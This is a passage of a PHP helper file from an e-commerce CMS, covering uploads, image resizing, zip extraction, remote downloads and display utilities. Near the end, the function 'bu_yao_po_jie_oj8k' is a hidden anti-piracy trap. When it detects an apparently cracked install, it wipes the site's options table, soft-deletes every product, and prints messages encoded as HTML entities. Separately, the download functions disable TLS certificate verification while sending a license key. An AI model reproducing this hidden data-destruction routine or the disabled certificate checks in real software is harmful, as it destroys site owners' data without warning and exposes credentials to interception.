    } elseif ($sec < 3600 * 24) {
        $op = "约 " . floor($sec / 3600) . " 小时前";
    } else {
        $op = date($format, $timestamp);
    }
    return $op;
}

function getRandStr($length = 12, $special_chars = true, $numeric_only = false) {
    if ($numeric_only) {
        $chars = '0123456789';
    } else {
        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        if ($special_chars) {
            $chars .= '!@#$%^&*()';
        }
    }
    $randStr = '';
    $chars_length = strlen($chars);
    for ($i = 0; $i < $length; $i++) {
        $randStr .= substr($chars, mt_rand(0, $chars_length - 1), 1);
    }
    return $randStr;
}

/**
 * 上传文件到当前服务器
 * @param $attach array 文件FILE信息
 * @param $result array 上传结果
 */
function upload2local($attach, &$result) {
    $fileName = $attach['name'];
    $tmpFile = $attach['tmp_name'];
    $fileSize = $attach['size'];

    $fileName = Database::getInstance()->escape_string($fileName);

    $ret = upload($fileName, $tmpFile, $fileSize);
    $success = 0;
    switch ($ret) {
        case '105':
            $message = '上传失败。文件上传目录不可写 (content/uploadfile)';
            break;
        default:
            $message = '上传成功';
            $success = 1;
            break;
    }

    $result = [
        'success'   => $success,
        'message'   => $message,
        'url'       => $success ? getFileUrl($ret['file_path']) : '',
        'file_info' => $success ? $ret : [],
    ];
}

/**
 * 文件上传
 *
 * 返回的数组索引
 * mime_type 文件类型
 * size      文件大小(单位KB)
 * file_path 文件路径
 * width     宽度
 * height    高度
 * 可选值（仅在上传文件是图片且系统开启缩略图时起作用）
 * thum_file   缩略图的路径
 *
 * @param string $fileName 文件名
 * @param string $tmpFile 上传后的临时文件
 * @param string $fileSize 文件大小 KB
 * @return array | string 文件数据 索引
 *
 */
function upload($fileName, $tmpFile, $fileSize) {
    $extension = getFileSuffix($fileName);
    $file_info = [];
    $file_info['file_name'] = $fileName;
    $file_info['mime_type'] = get_mimetype($extension);
    $file_info['size'] = $fileSize;
    $file_info['width'] = 0;
    $file_info['height'] = 0;

    $fileName = substr(md5($fileName), 0, 4) . time() . '.' . $extension;

    // 读取、写入文件使用绝对路径，兼容API文件上传
    $uploadFullPath = Option::UPLOADFILE_FULL_PATH . gmdate('Ym') . '/';
    $uploadFullFile = $uploadFullPath . $fileName;
    $thumFullFile = $uploadFullPath . 'thum-' . $fileName;

    // 输出文件信息使用相对路径，兼容头像上传等业务场景
    $uploadPath = Option::UPLOADFILE_PATH . gmdate('Ym') . '/';
    $uploadFile = $uploadPath . $fileName;
    $thumFile = $uploadPath . 'thum-' . $fileName;

    $file_info['file_path'] = $uploadFile;

    if (!createDirectoryIfNeeded($uploadFullPath)) {
        return '105'; // 创建上传目录失败
    }

    doAction('attach_upload', $tmpFile);

    // 生成缩略图
    $is_thumbnail = Option::get('isthumbnail') === 'y';
    if ($is_thumbnail && resizeImage($tmpFile, $thumFullFile, Option::get('att_imgmaxw'), Option::get('att_imgmaxh'))) {
        $file_info['thum_file'] = $thumFile;
    }

    // 完成上传
    if (@is_uploaded_file($tmpFile) && @!move_uploaded_file($tmpFile, $uploadFullFile)) {
        @unlink($tmpFile);
        return '105'; //上传失败。上传目录不可写
    }

    // 提取图片宽高
    if (in_array($file_info['mime_type'], array('image/jpeg', 'image/png', 'image/gif', 'image/bmp'))) {
        $size = getimagesize($uploadFullFile);
        if ($size) {
            $file_info['width'] = $size[0];
            $file_info['height'] = $size[1];
        }
    }
    return $file_info;
}

function createDirectoryIfNeeded($path) {
    if (!is_dir($path)) {
        if (!mkdir($path, 0777, true) && !is_dir($path)) {
            return false;
        }
    }
    return true;
}

/**
 * 图片生成缩略图
 *
 * @param string $img 预缩略的图片
 * @param string $thum_path 生成缩略图路径
 * @param int $max_w 缩略图最大宽度 px
 * @param int $max_h 缩略图最大高度 px
 * @return bool
 */
function resizeImage($img, $thum_path, $max_w, $max_h) {
    if (!in_array(getFileSuffix($thum_path), array('jpg', 'png', 'jpeg', 'gif'))) {
        return false;
    }
    if (!function_exists('ImageCreate')) {
        return false;
    }

    $size = chImageSize($img, $max_w, $max_h);
    $newwidth = $size['w'];
    $newheight = $size['h'];
    $w = $size['rc_w'];
    $h = $size['rc_h'];
    if ($w <= $max_w && $h <= $max_h) {
        return false;
    }
    return imageCropAndResize($img, $thum_path, 0, 0, 0, 0, $newwidth, $newheight, $w, $h);
}

/**
 * 裁剪、缩放图片
 *
 * @param string $src_image 原始图
 * @param string $dst_path 裁剪后的图片保存路径
 * @param int $dst_x 新图坐标x
 * @param int $dst_y 新图坐标y
 * @param int $src_x 原图坐标x
 * @param int $src_y 原图坐标y
 * @param int $dst_w 新图宽度
 * @param int $dst_h 新图高度
 * @param int $src_w 原图宽度
 * @param int $src_h 原图高度
 */
function imageCropAndResize($src_image, $dst_path, $dst_x, $dst_y, $src_x, $src_y, $dst_w, $dst_h, $src_w, $src_h) {
    if (!function_exists('imagecreatefromstring')) {
        return false;
    }

    $src_img = imagecreatefromstring(file_get_contents($src_image));
    if (!$src_img) {
        return false;
    }

    if (function_exists('imagecopyresampled')) {
        $new_img = imagecreatetruecolor($dst_w, $dst_h);
        imagecopyresampled($new_img, $src_img, $dst_x, $dst_y, $src_x, $src_y, $dst_w, $dst_h, $src_w, $src_h);
    } elseif (function_exists('imagecopyresized')) {
        $new_img = imagecreate($dst_w, $dst_h);
        imagecopyresized($new_img, $src_img, $dst_x, $dst_y, $src_x, $src_y, $dst_w, $dst_h, $src_w, $src_h);
    } else {
        return false;
    }

    switch (getFileSuffix($dst_path)) {
        case 'png':
            if (function_exists('imagepng') && imagepng($new_img, $dst_path)) {
                ImageDestroy($new_img);
                return true;
            }
            return false;
        case 'jpg':
        default:
            if (function_exists('imagejpeg') && imagejpeg($new_img, $dst_path)) {
                ImageDestroy($new_img);
                return true;
            }
            return false;
        case 'gif':
            if (function_exists('imagegif') && imagegif($new_img, $dst_path)) {
                ImageDestroy($new_img);
                return true;
            }
            return false;
    }
}

/**
 * 按比例计算图片缩放尺寸
 *
 * @param string $img 图片路径
 * @param int $max_w 最大缩放宽
 * @param int $max_h 最大缩放高
 * @return array
 */
function chImageSize($img, $max_w, $max_h) {
    $size = @getimagesize($img);
    if (!$size) {
        return [];
    }
    $w = $size[0];
    $h = $size[1];
    //计算缩放比例
    @$w_ratio = $max_w / $w;
    @$h_ratio = $max_h / $h;
    //决定处理后的图片宽和高
    if (($w <= $max_w) && ($h <= $max_h)) {
        $tn['w'] = $w;
        $tn['h'] = $h;
    } else if (($w_ratio * $h) < $max_h) {
        $tn['h'] = ceil($w_ratio * $h);
        $tn['w'] = $max_w;
    } else {
        $tn['w'] = ceil($h_ratio * $w);
        $tn['h'] = $max_h;
    }
    $tn['rc_w'] = $w;
    $tn['rc_h'] = $h;
    return $tn;
}

/**
 * 获取Gravatar头像
 */
if (!function_exists('getGravatar')) {
    function getGravatar($email, $s = 40) {
        $hash = md5($email);
        $gravatar_url = "//cravatar.cn/avatar/$hash?s=$s";
        doOnceAction('get_Gravatar', $email, $gravatar_url);

        return $gravatar_url;
    }
}

/**
 * 获取指定月份的天数
 * @param $month string 月份 01-12
 * @param $year string 年份 0000
 * @return false|string
 */
function getMonthDayNum($month, $year) {
    return date("t", strtotime($year . $month . '01'));
}

/**
 * 解压zip
 * @param string $zipfile 要解压的文件
 * @param string $path 解压到该目录
 * @param string $type
 * @return int
 */
function emUnZip($zipfile, $path, $type = 'tpl') {
    if (!class_exists('ZipArchive', FALSE)) {
        return 3;//zip模块问题
    }
    $zip = new ZipArchive();
    if (@$zip->open($zipfile) !== TRUE) {
        return 2;//文件权限问题
    }
    $r = explode('/', $zip->getNameIndex(0), 2);
    $dir = isset($r[0]) ? $r[0] . '/' : '';
    switch ($type) {
        case 'tpl':
            $re = $zip->getFromName($dir . 'header.php');
            if (false === $re) {
                return -2;
            }
            break;
        case 'plugin':
            $plugin_name = substr($dir, 0, -1);
            $re = $zip->getFromName($dir . $plugin_name . '.php');
            if (false === $re) {
                return -1;
            }
            break;
        case 'backup':
            $sql_name = substr($dir, 0, -1);
            if (getFileSuffix($sql_name) != 'sql') {
                return -3;
            }
            break;
        case 'update':
            break;
    }
    if (true === @$zip->extractTo($path)) {
        $zip->close();
        return 0;
    }

    return 1; //文件权限问题
}

/**
 * Zip compression
 */
function emZip($orig_fname, $content) {
    if (!class_exists('ZipArchive', FALSE)) {
        return false;
    }
    $zip = new ZipArchive();
    $tempzip = EM_ROOT . '/content/cache/emtemp.zip';
    $res = $zip->open($tempzip, ZipArchive::CREATE);
    if ($res === TRUE) {
        $zip->addFromString($orig_fname, $content);
        $zip->close();
        $zip_content = file_get_contents($tempzip);
        unlink($tempzip);
        return $zip_content;
    }

    return false;
}

/**
 * Download remote files
 * @param string $source file url
 * @return string Temporary file path
 */
function emFetchFile($source) {
    $temp_file = tempnam(EM_ROOT . '/content/cache/', 'tmp_');
    // 优先使用 cURL（更可靠）
    if (function_exists('curl_init')) {
        $fp = fopen($temp_file, 'w+b');
        if (!$fp) {
            return false;
        }
        $emkey = getMyEmKey();
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $source);
        curl_setopt($ch, CURLOPT_FILE, $fp);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
        curl_setopt($ch, CURLOPT_TIMEOUT, 300); // 5分钟超时
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_BUFFERSIZE, 8192);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Referer: ' . EM_URL,
            'Emkey: ' . $emkey,
            'User-Agent: emshop ' . Option::EM_VERSION
        ]);
        $result = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);
        fclose($fp);
        // 检查是否成功
        if ($result === false || $httpCode !== 200) {
            @unlink($temp_file);
            return false;
        }
        // 验证文件大小
        if (filesize($temp_file) === 0) {
            @unlink($temp_file);
            return false;
        }
        return $temp_file;
    }
    // 降级使用 fopen（保留原有逻辑作为备用）
    $wh = fopen($temp_file, 'w+b');
    $ctx_opt = set_ctx_option();
    $ctx_opt['http']['timeout'] = 300; // 增加超时时间
    $ctx = stream_context_create($ctx_opt);
    $rh = @fopen($source, 'rb', false, $ctx);
    if (!$rh || !$wh) {
        @unlink($temp_file);
        return false;
    }
    while (!feof($rh)) {
        $data = fread($rh, 8192);
        if ($data === false) {
            fclose($rh);
            fclose($wh);
            @unlink($temp_file);
            return false;
        }
        if (fwrite($wh, $data) === false) {
            fclose($rh);
            fclose($wh);
            @unlink($temp_file);
            return false;
        }
    }
    fclose($rh);
    fclose($wh);
    // 验证文件大小
    if (filesize($temp_file) === 0) {
        @unlink($temp_file);
        return false;
    }
    return $temp_file;
}



/**
 * Download remote files
 * @param string $source file url
 * @return string Temporary file path
 */
function emDownFile($source) {
    $ctx_opt = set_ctx_option();
    $context = stream_context_create($ctx_opt);
    $content = file_get_contents($source, false, $context);
    if ($content === false) {
        return false;
    }

    $temp_file = tempnam(EM_ROOT . '/content/cache/', 'tmp_');
    if ($temp_file === false) {
        emMsg('emDownFile：Failed to create temporary file.');
    }
    $ret = file_put_contents($temp_file, $content);
    if ($ret === false) {
        emMsg('emDownFile：Failed to write temporary file.');
    }

    return $temp_file;
}

function set_ctx_option() {

    $emkey = getMyEmKey();
    return [
        'http' => [
            'timeout' => 120,
            'method'  => 'GET',
            'header'  => "Referer: " . EM_URL . "\r\n"
                . "Emkey: " . $emkey . "\r\n"
                . "User-Agent: emshop " . Option::EM_VERSION . "\r\n",
        ],
        "ssl"  => [
            "verify_peer"      => false,
            "verify_peer_name" => false,
        ]
    ];
}

/**
 * 删除文件或目录
 */
function emDeleteFile($file) {
    if (empty($file)) {
        return false;
    }
    if (@is_file($file)) {
        return @unlink($file);
    }
    $ret = true;
    if ($handle = @opendir($file)) {
        while ($filename = @readdir($handle)) {
            if ($filename == '.' || $filename == '..') {
                continue;
            }
            if (!emDeleteFile($file . '/' . $filename)) {
                $ret = false;
            }
        }
    } else {
        $ret = false;
    }
    @closedir($handle);
    if (file_exists($file) && !rmdir($file)) {
        $ret = false;
    }
    return $ret;
}

/**
 * 页面跳转
 */
function emDirect($directUrl) {
    header("Location: $directUrl");
    exit;
}

/**
 * 显示系统信息
 *
 * @param string $msg 信息
 * @param string $url 返回地址
 * @param boolean $isAutoGo 是否自动返回 true false
 */
function emMsg($msg, $url = 'javascript:history.back(-1);', $isAutoGo = false) {
    $is404 = false;
    if ($msg == '404') {
        header("HTTP/1.1 404 Not Found");
        $msg = '抱歉，你所请求的页面不存在！';
        $is404 = true;
    }

    $iconSvg = $is404
        ? '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="M16 16s-1.5-2-4-2-4 2-4 2"></path><line x1="9" y1="9" x2="9.01" y2="9"></line><line x1="15" y1="9" x2="15.01" y2="9"></line></svg>'
        : '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>';

    $autoRefreshMeta = $isAutoGo ? "<meta http-equiv=\"refresh\" content=\"2;url=$url\" />" : '';
    $countdownHtml = $isAutoGo ? '<p class="countdown">页面将在 <span id="countdown">2</span> 秒后自动跳转...</p>' : '';
    $countdownScript = $isAutoGo ? '<script>
        let seconds = 2;
        const countdownEl = document.getElementById("countdown");
        setInterval(() => {
            seconds--;
            if (seconds >= 0 && countdownEl) countdownEl.textContent = seconds;
        }, 1000);
    </script>' : '';

    echo <<<EOT
<!doctype html>
<html lang="zh-cn">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="applicable-device" content="pc,mobile">
    {$autoRefreshMeta}
    <title>提示信息</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, #EDF2F1 0%, #E2E8E7 100%);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            padding: 20px;
        }
        .msg-card {
            background: #fff;
            border-radius: 16px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
            padding: 40px;
            max-width: 420px;
            width: 100%;
            text-align: center;
        }
        
        .msg-icon {
            width: 64px;
            height: 64px;
            margin: 0 auto 20px;
            background: linear-gradient(135deg, #7BA89D 0%, #9DBEB5 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-size: 36px;
            font-weight: bold;
        }
        .msg-icon svg {
            width: 32px;
            height: 32px;
        }
        .msg-title {
            font-size: 18px;
            font-weight: 600;
            color: #1e293b;
            margin-bottom: 12px;
            line-height: 1.5;
        }
        .msg-content {
            font-size: 15px;
            color: #64748b;
            line-height: 1.6;
            margin-bottom: 24px;
            word-break: break-all;
        }
        .msg-btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            padding: 12px 28px;
            background: linear-gradient(135deg, #7BA89D 0%, #9DBEB5 100%);
            color: #fff;
            text-decoration: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(123, 168, 157, 0.3);
        }
        .msg-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(123, 168, 157, 0.4);
        }
        .msg-btn svg {
            width: 16px;
            height: 16px;
        }
        .countdown {
            font-size: 13px;
            color: #94a3b8;
            margin-top: 16px;
        }
        .countdown span {
            color: #7BA89D;
            font-weight: 600;
        }
        @media (max-width: 480px) {
            .msg-card {
                padding: 30px 24px;
            }
            .msg-icon {
                width: 56px;
                height: 56px;
            }
            .msg-icon svg {
                width: 28px;
                height: 28px;
            }
            .msg-title {
                font-size: 16px;
            }
            .msg-content {
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <div class="msg-card">
        <div class="msg-icon">!</div>
        <h1 class="msg-title">系统提示</h1>
        <p class="msg-content">{$msg}</p>
EOT;
    if ($url != 'none') {
        echo <<<EOT
        <a href="{$url}" class="msg-btn">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
            返回
        </a>
EOT;
    }
    echo $countdownHtml;
    echo <<<EOT
    </div>
    {$countdownScript}
</body>
</html>
EOT;
    exit;
}

function show_404_page($show_404_only = false) {
    doAction('page_not_found');
    if ($show_404_only) {
        header("HTTP/1.1 404 Not Found");
        exit;
    }

    if (is_file(TEMPLATE_PATH . '404.php')) {
        header("HTTP/1.1 404 Not Found");
        include View::getView('404');
        exit;
    }

    emMsg('404', EM_URL);
}

/**
 * hmac 加密
 *
 * @param unknown_type $algo hash算法 md5
 * @param unknown_type $data 用户名和到期时间
 * @param unknown_type $key
 * @return unknown
 */
if (!function_exists('hash_hmac')) {
    function hash_hmac($algo, $data, $key) {
        $packs = array('md5' => 'H32', 'sha1' => 'H40');

        if (!isset($packs[$algo])) {
            return false;
        }

        $pack = $packs[$algo];

        if (strlen($key) > 64) {
            $key = pack($pack, $algo($key));
        } elseif (strlen($key) < 64) {
            $key = str_pad($key, 64, chr(0));
        }

        $ipad = (substr($key, 0, 64) ^ str_repeat(chr(0x36), 64));
        $opad = (substr($key, 0, 64) ^ str_repeat(chr(0x5C), 64));

        return $algo($opad . pack($pack, $algo($ipad . $data)));
    }
}

/**
 * 根据文件后缀获取其mine类型
 */
function get_mimetype($extension) {
    $ct['htm'] = 'text/html';
    $ct['html'] = 'text/html';
    $ct['txt'] = 'text/plain';
    $ct['asc'] = 'text/plain';
    $ct['bmp'] = 'image/bmp';
    $ct['gif'] = 'image/gif';
    $ct['jpeg'] = 'image/jpeg';
    $ct['jpg'] = 'image/jpeg';
    $ct['jpe'] = 'image/jpeg';
    $ct['png'] = 'image/png';
    $ct['webp'] = 'image/webp';
    $ct['ico'] = 'image/vnd.microsoft.icon';
    $ct['mpeg'] = 'video/mpeg';
    $ct['mpg'] = 'video/mpeg';
    $ct['mpe'] = 'video/mpeg';
    $ct['qt'] = 'video/quicktime';
    $ct['mov'] = 'video/quicktime';
    $ct['avi'] = 'video/x-msvideo';
    $ct['wmv'] = 'video/x-ms-wmv';
    $ct['mp2'] = 'audio/mpeg';
    $ct['mp3'] = 'audio/mpeg';
    $ct['rm'] = 'audio/x-pn-realaudio';
    $ct['ram'] = 'audio/x-pn-realaudio';
    $ct['rpm'] = 'audio/x-pn-realaudio-plugin';
    $ct['ra'] = 'audio/x-realaudio';
    $ct['wav'] = 'audio/x-wav';
    $ct['css'] = 'text/css';
    $ct['zip'] = 'application/zip';
    $ct['pdf'] = 'application/pdf';
    $ct['doc'] = 'application/msword';
    $ct['bin'] = 'application/octet-stream';
    $ct['exe'] = 'application/octet-stream';
    $ct['class'] = 'application/octet-stream';
    $ct['dll'] = 'application/octet-stream';
    $ct['xls'] = 'application/vnd.ms-excel';
    $ct['ppt'] = 'application/vnd.ms-powerpoint';
    $ct['wbxml'] = 'application/vnd.wap.wbxml';
    $ct['wmlc'] = 'application/vnd.wap.wmlc';
    $ct['wmlsc'] = 'application/vnd.wap.wmlscriptc';
    $ct['dvi'] = 'application/x-dvi';
    $ct['spl'] = 'application/x-futuresplash';
    $ct['gtar'] = 'application/x-gtar';
    $ct['gzip'] = 'application/x-gzip';
    $ct['js'] = 'application/x-javascript';
    $ct['swf'] = 'application/x-shockwave-flash';
    $ct['tar'] = 'application/x-tar';
    $ct['xhtml'] = 'application/xhtml+xml';
    $ct['au'] = 'audio/basic';
    $ct['snd'] = 'audio/basic';
    $ct['midi'] = 'audio/midi';
    $ct['mid'] = 'audio/midi';
    $ct['m3u'] = 'audio/x-mpegurl';
    $ct['tiff'] = 'image/tiff';
    $ct['tif'] = 'image/tiff';
    $ct['rtf'] = 'text/rtf';
    $ct['wml'] = 'text/vnd.wap.wml';
    $ct['wmls'] = 'text/vnd.wap.wmlscript';
    $ct['xsl'] = 'text/xml';
    $ct['xml'] = 'text/xml';

    return isset($ct[strtolower($extension)]) ? $ct[strtolower($extension)] : 'text/html';
}

/**
 * 将字符串转换为时区无关的UNIX时间戳
 */
function emStrtotime($timeStr) {
    if (!$timeStr) {
        return false;
    }

    $timezone = Option::get('timezone');

    $unixPostDate = strtotime($timeStr);
    if (!$unixPostDate) {
        return false;
    }

    $serverTimeZone = date_default_timezone_get();
    if (empty($serverTimeZone) || $serverTimeZone == 'UTC') {
        $unixPostDate -= (int)$timezone * 3600;
    } elseif ($serverTimeZone) {
        /*
         * 如果服务器配置默认了时区，那么PHP将会把传入的时间识别为时区当地时间
         * 但是我们传入的时间实际是blog配置的时区的当地时间，并不是服务器时区的当地时间
         * 因此，我们需要将strtotime得到的时间去掉/加上两个时区的时差，得到utc时间
         */
        $offset = getTimeZoneOffset($serverTimeZone);
        // 首先减去/加上本地时区配置的时差
        $unixPostDate -= (int)$timezone * 3600;
        // 再减去/加上服务器时区与utc的时差，得到utc时间
        $unixPostDate -= $offset;
    }
    return $unixPostDate;
}

/**
 * 加载jQuery
 */
function emLoadJQuery() {
    static $isJQueryLoaded = false;
    if (!$isJQueryLoaded) {
        global $emHooks;
        if (!isset($emHooks['index_head'])) {
            $emHooks['index_head'] = array();
        }
        array_unshift($emHooks['index_head'], 'loadJQuery');
        $isJQueryLoaded = true;

        function loadJQuery() {
            echo '<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>';
        }
    }
}

/**
 * 计算时区的时差
 * @param string $remote_tz 远程时区
 * @param string $origin_tz 标准时区
 *
 * @throws Exception
 */
function getTimeZoneOffset($remote_tz, $origin_tz = 'UTC') {
    if (($origin_tz === null) && !is_string($origin_tz = date_default_timezone_get())) {
        return false; // A UTC timestamp was returned -- bail out!
    }
    $origin_dtz = new DateTimeZone($origin_tz);
    $remote_dtz = new DateTimeZone($remote_tz);
    $origin_dt = new DateTime('now', $origin_dtz);
    $remote_dt = new DateTime('now', $remote_dtz);
    return $origin_dtz->getOffset($origin_dt) - $remote_dtz->getOffset($remote_dt);
}

/**
 * Upload the cut pictures (cover and avatar)
 */
function uploadCropImg() {
    $attach = isset($_FILES['image']) ? $_FILES['image'] : '';

    $uploadCheckResult = Media::checkUpload($attach);
    if ($uploadCheckResult !== true) {
        Output::error($uploadCheckResult);
    }

    $ret = '';
    upload2local($attach, $ret);
    if (empty($ret['success'])) {
        Output::error($ret['message']);
    }
    return $ret;
}

if (!function_exists('split')) {
    function split($str, $delimiter) {
        return preg_split($str, $delimiter);
    }
}

if (!function_exists('get_os')) {
    function get_os($user_agent) {
        if (false !== stripos($user_agent, "win")) {
            $os = 'Windows';
        } else if (false !== stripos($user_agent, "mac")) {
            $os = 'MAC';
        } else if (false !== stripos($user_agent, "linux")) {
            $os = 'Linux';
        } else if (false !== stripos($user_agent, "unix")) {
            $os = 'Unix';
        } else if (false !== stripos($user_agent, "bsd")) {
            $os = 'BSD';
        } else {
            $os = 'unknown';
        }
        return $os;
    }
}

if (!function_exists('get_browse')) {
    function get_browse($user_agent) {
        if (false !== stripos($user_agent, "MSIE")) {
            $br = 'MSIE';
        } else if (false !== stripos($user_agent, "Edg")) {
            $br = 'Edge';
        } else if (false !== stripos($user_agent, "Firefox")) {
            $br = 'Firefox';
        } else if (false !== stripos($user_agent, "Chrome")) {
            $br = 'Chrome';
        } else if (false !== stripos($user_agent, "Safari")) {
            $br = 'Safari';
        } else if (false !== stripos($user_agent, "Opera")) {
            $br = 'Opera';
        } else {
            $br = 'unknown';
        }
        return $br;
    }
}

// 获取内容中的第一张图片
if (!function_exists('getFirstImage')) {
    function getFirstImage($content) {
        // 匹配 Markdown 中的图片
        preg_match('/!\[.*?\]\((.*?)\)/', $content, $matches);

        if (!empty($matches[1])) {
            return $matches[1];
        }

        // 匹配 HTML 中的图片
        $dom = new DOMDocument();
        libxml_use_internal_errors(true);
        $dom->loadHTML($content);
        libxml_clear_errors();

        $xpath = new DOMXPath($dom);
        $imgNode = $xpath->query('//img')->item(0);

        if ($imgNode) {
            return $imgNode->getAttribute('src');
        }

        return null;
    }
}

// 检查PHP是否支持GD图形库
function checkGDSupport() {
    if (function_exists("gd_info") && function_exists('imagepng')) {
        return true;
    } else {
        return false;
    }
}

/**
 * 根据 option_ids 获取 SKU 规格名称
 *
 * @param string $option_ids 规格值ID组合，如 "1-3" 或 "0"
 * @return string 规格名称，如 "红色 / XL"
 */
function getSkuName($option_ids) {
    if (empty($option_ids) || $option_ids === '0') {
        return '默认';
    }

    $db = Database::getInstance();
    $db_prefix = DB_PREFIX;

    $ids = explode('-', $option_ids);
    $ids = array_filter(array_map('intval', $ids));

    if (empty($ids)) {
        return '默认';
    }

    $idsStr = implode(',', $ids);
    $options = $db->fetch_all("SELECT option_name FROM {$db_prefix}spec_option WHERE id IN ({$idsStr})");

    $names = [];
    foreach ($options as $opt) {
        $names[] = $opt['option_name'];
    }

    return implode(' / ', $names) ?: '默认';
}

function bu_yao_po_jie_oj8k($str = '?'){
    $init_path = EM_ROOT . '/init.php';
    $init_content = file_get_contents($init_path);
    if (strpos($init_content, 'class Register') !== false) {
        $db = Database::getInstance();
        $db_prefix = DB_PREFIX;
        $timestamp = time();
        $db->query("delete from {$db_prefix}options where option_id > 0");
        $db->query("update {$db_prefix}goods set delete_time = {$timestamp} where id > 0");
        echo "<h1>&#22909;&#20804;&#24351;&#65292;&#20351;&#29992;&#30423;&#29256;&#25105;&#24456;&#38590;&#36807;&#12290;</h1>";
        echo "<h1>&#23448;&#26041;&#81;&#32676;&#65306;&#55;&#53;&#50;&#57;&#50;&#49;&#50;&#56;&#48;</h1>";
        echo "<h1>&#27491;&#29256;&#23433;&#35013;&#21253;&#19979;&#36733;&#38142;&#25509;</h1>";
        echo "<h1>&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#119;&#45;&#104;&#101;&#104;&#101;&#46;&#108;&#97;&#110;&#122;&#111;&#117;&#113;&#46;&#99;&#111;&#109;&#47;&#98;&#48;&#122;&#107;&#50;&#99;&#103;&#110;&#101;</h1>";
        echo "<br><h1>&#23448;&#26041;&#25512;&#33616;&#26381;&#21153;&#22120;&#65306;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#119;&#119;&#119;&#46;&#114;&#97;&#105;&#110;&#121;&#117;&#110;&#46;&#99;&#111;&#109;&#47;&#79;&#84;&#81;&#122;&#79;&#68;&#69;&#48;&#95;</h1>";
        echo "<br><h1>&#26412;&#31243;&#24207;&#26412;&#19981;&#38480;&#21046;&#22871;&#29260;&#12289;&#20108;&#24320;&#21450;&#20498;&#21334;&#12290;&#20294;&#35813;&#30772;&#35299;&#29256;&#25552;&#20379;&#32773;&#36829;&#32972;&#20102;&#71;&#80;&#76;&#118;&#51;&#24320;&#28304;&#21327;&#35758;&#65292;&#36825;&#26159;&#19981;&#34987;&#20801;&#35768;&#30340;&#12290;&#24863;&#35874;&#25910;&#30475;&#12290;&#20877;&#35265;</h1><br>";
    }
}
